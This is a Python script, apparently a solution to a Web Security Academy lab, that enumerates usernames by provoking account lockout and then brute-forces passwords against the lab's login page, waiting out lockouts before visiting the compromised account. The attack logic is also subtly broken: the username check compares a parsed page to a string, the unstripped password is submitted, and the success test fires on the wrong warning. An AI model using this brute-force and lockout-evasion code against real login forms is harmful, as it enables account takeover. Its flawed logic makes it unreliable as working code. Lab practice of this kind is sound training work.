import requests, time
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ac101fa21e840db4c0a498d00044001c.web-security-academy.net'

#Given the site name, use python to construct the login page 
#using f-string will serve as a template to directly include values of variables
login_url = f'''https://{site}/login'''

lines = open('auth-lab-usernames', "r").readlines()

def try_user(username):
    ...
    logindata = {
        'username' : username,
        'password' : 'foo'
    }
    for i in range(6):
        resp = s.post(login_url, data=logindata)
    ...
    return resp.text

def try_pass(username, password):
    ...
    logindata = {
        'username' : username,
        'password' : password
    }
    print(f'Testing Case: [user]: {username} && [pass]: {password}')
    resp = s.post(login_url, data=logindata)

    return resp.text

#Goes through list of usernames till one is located
for user in lines:
    target = user.strip()
    results = try_user(target)
    print(f'Testing User Case: {target}')
    soup = BeautifulSoup(results,'html.parser')
    if soup != 'Invalid username or password.':
        break
print(f'== Username: {target} ==')


#Goes through the password list undtil there is no more is-warning class
pass_lines = open('auth-lab-passwords', "r").readlines()
for password in pass_lines:
    target_p = password.strip()
    passwordResults = try_pass(target, password)
    soup = BeautifulSoup(passwordResults, 'html.parser')
    if soup.find('p', {'class':'is-warning'}):
        if soup.find('p', {'class':'is-warning'}).text == 'You have made too many incorrect login attempts. Please try again in 1 minute(s).':
            print('Timeout for 60 sec...')
            time.sleep(60)
            continue
        else:
            print(f'== User:{target} | Password: {target_p} ==')

#goes to link to complete CTF
s.get(f'https://{site}/my-account?id={target}')